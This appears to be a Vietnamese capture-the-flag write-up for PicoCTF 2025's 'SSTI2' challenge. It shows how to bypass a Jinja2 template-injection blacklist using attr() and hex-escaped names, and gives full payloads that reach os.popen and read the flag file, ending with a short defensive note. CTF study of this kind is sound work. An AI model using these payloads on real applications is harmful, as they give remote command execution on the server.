# [Write-up] PicoCTF 2025 - SSTI2

## 1. Thông tin thử thách
*   **Tên bài:** SSTI2
*   **Thể loại:** Web Exploitation
*   **Mục tiêu:** Khai thác lỗ hổng Server-Side Template Injection (SSTI) để thực thi lệnh hệ thống (RCE) và chiếm quyền đọc file Flag.

## 2. Phân tích lỗ hổng (Reconnaissance)
Khi nhập liệu vào ô "announce", ứng dụng sẽ phản hồi lại thông tin đó trên trang web. Thử nghiệm với các payload cơ bản:
*   `{{7*7}}`: Trả về `49`. Xác nhận máy chủ sử dụng công cụ nạp mẫu (Template Engine) **Jinja2** (Python).
*   `{{config}}`: Bị chặn hoặc không trả về kết quả.
*   `{{self.__class__}}`: Gặp lỗi xử lý.

**Kết luận:** Máy chủ đã thiết lập một bộ lọc (Blacklist) để chặn các ký tự và từ khóa nhạy cảm bao gồm:
*   Dấu chấm (`.`)
*   Dấu gạch dưới (`_`)
*   Một số từ khóa như `config`, `request`.

## 3. Chiến thuật vượt lỗi (Bypass Strategy)
Để vượt qua bộ lọc này, chúng ta sử dụng hai kỹ thuật chính:
1.  **Sử dụng Filter `attr()`**: Thay vì dùng dấu chấm (`obj.attr`), ta dùng `obj|attr("attr")`.
2.  **Hex Encoding**: Mã hóa các chuỗi nhạy cảm sang mã Hex (`__class__` -> `\x5f\x5fclass\x5f\x5f`) để qua mặt bộ lọc chuỗi của ứng dụng.

## 4. Các bước khai thác chi tiết

### Bước 1: Liệt kê các Subclasses
Khởi đầu từ đối tượng `self`, ta truy cập vào class cha (`object`) và liệt kê tất cả các lớp con đang được nạp trong bộ nhớ:
**Payload:**
```jinja2
{{self|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")(1)|attr("\x5f\x5fsubclasses\x5f\x5f")()}}
```

### Bước 2: Tìm kiếm "Gặp gỡ" `os._wrap_close`
Trong danh sách hàng trăm class trả về, ta tìm thấy class `os._wrap_close`. Class này rất quan trọng vì nó chứa tham chiếu trực tiếp đến module `os` bên trong thuộc tính `__globals__`.

Sử dụng script Python để đếm vị trí, ta xác định được Index của nó là **132**.

### Bước 3: Thực thi lệnh hệ thống (RCE)
Xây dựng chuỗi Payload hoàn chỉnh để truy cập vào `os.popen()` và thực thi lệnh đọc nội dung file cờ:

**Payload cuối cùng:**
```jinja2
{{ self|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")(1)|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(132)|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat flag.txt")|attr("read")() }}
```

**Lưu ý:** Trước khi gửi qua Burp Suite, toàn bộ Payload cần được **URL-encoded** để đảm bảo máy chủ không hiểu sai các ký tự đặc biệt.

## 5. Kết luận
Lỗ hổng SSTI kết hợp với việc sanitize input không đầy đủ (chỉ dựa vào blacklist) cho phép kẻ tấn công leo thang đặc quyền từ một template đơn giản lên thực thi lệnh trên hệ điều hành. Cách phòng chống tốt nhất là không cho phép người dùng nhập liệu vào template hoặc sử dụng các cơ chế thực thi template an toàn (Sandboxed environments) với quyền hạn hạn chế tối đa.
